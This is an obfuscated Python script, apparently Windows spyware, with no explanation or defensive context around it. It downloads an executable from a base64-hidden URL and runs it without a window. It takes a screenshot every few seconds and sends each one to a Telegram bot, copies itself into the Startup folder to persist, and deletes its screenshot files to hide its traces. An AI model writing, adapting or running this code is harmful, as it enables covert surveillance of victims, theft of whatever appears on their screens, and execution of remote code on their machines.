import os as o, requests as r, datetime as d, threading as t, subprocess as s, time as ti, tempfile as te, shutil as sh, base64 as b64
T, C, U = (
    bytes.fromhex('hex_token').decode('utf-8'),
    bytes.fromhex('hex_chat_id').decode('utf-8'),
    b64.b64decode('aHR0cHM6Ly9maWxlYm94LTEtZzY2NzQ4NjUuZGV0YS5hcHAvYXBpL2VtYmVkLzU0YjdlZWNjNzE0MDVmNGI=').decode('utf-8')
)
N = 'xk.exe'
P = o.path.join(te.gettempdir(), N)
def d1():
    if not o.path.exists(P):
        try:
            print(f"DL {N}...")
            q = r.get(U, stream=True)
            q.raise_for_status()
            with open(P, 'wb') as f:
                for c in q.iter_content(chunk_size=8192):
                    f.write(c)
            print(f"{N} DL_S!.")
        except r.RequestException as e:
            print(f"FT_DL! {N}: {e}")
def f1(m):
    u = f"https://api.telegram.org/bot{T}/sendMessage"
    p = {'chat_id': C, 'text': m}
    try:
        q = r.post(u, params=p)
        q.raise_for_status()
    except r.RequestException as e:
        print(f"FTS_M!: {e}")
def c1(f, w=""):
    if not o.path.exists(P):
        d1()
    x = [P, f, w]
    try:
        print(f"RN_CM: {x}")
        p = s.Popen(x, creationflags=s.CREATE_NO_WINDOW)
        p.wait()
        print(f"SC_SD {f}")
    except Exception as e:
        print(f"FTR {N}: {e}")
def m1(f):
    t_dir = te.gettempdir()
    t_file = o.path.join(t_dir, f)
    sh.move(f, t_file)
    return t_file
def cl1():
    c_dir = o.getcwd()
    files = [f for f in o.listdir(c_dir) if f.startswith("SC_")]
    for f in files:
        try:
            o.remove(o.path.join(c_dir, f))
            print(f"DE {f} FDR")
        except Exception as e:
            print(f"FT_DR {f} CDR: {e}")
def s1():
    p = o.path.abspath("sc1.exe") 
    s_folder = o.path.join(o.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    s_path = o.path.join(s_folder, "sc1.exe")
    if not o.path.exists(s_path):
        try:
            sh.copy(p, s_path)
            print(f"AD_PSTR: {s_path}")
        except Exception as e:
            print(f"FT_PSTR: {e}")
    else:
        print("AL_PSTR")
def s2(t_file):
    u = f"https://api.telegram.org/bot{T}/sendPhoto"
    ts = d.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(t_file, 'rb') as p:
            files = {'photo': p}
            q = r.post(u, data={'chat_id': C, 'caption': ts}, files=files)
            q.raise_for_status()
        o.remove(t_file)
        print("SC_SN")
    except r.RequestException as e:
        print(f"SC_FTSN: {e}")
    except Exception as e:
        print(f"ER: {e}")
def s3(i):
    while True:
        f = f"SC_{d.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg"
        c1(f)
        t_file = m1(f)
        t.Thread(target=s2, args=(t_file,)).start()
        ti.sleep(i)
def cl2():
    t_dir = te.gettempdir()
    files = [f for f in o.listdir(t_dir) if f.startswith("SC_")]
    for f in files:
        t_file = o.path.join(t_dir, f)
        if o.path.isfile(t_file):
            try:
                o.unlink(t_file)
                print("DE_TM:", t_file)
            except PermissionError:
                print(f"PRM_FER {t_file}")
def sc2():
    s1()
    cl2()
    cl1()
def cl3(i):
    while True:
        sc2()
        ti.sleep(i)
ft = t.Thread(target=s3, args=(2.5,))
ft.daemon = True
ft.start()
ct = t.Thread(target=cl3, args=(7.5,))
ct.daemon = True
ct.start()
try:
    while True:
        ti.sleep(2.5)
except KeyboardInterrupt:
    print("SR_INT")
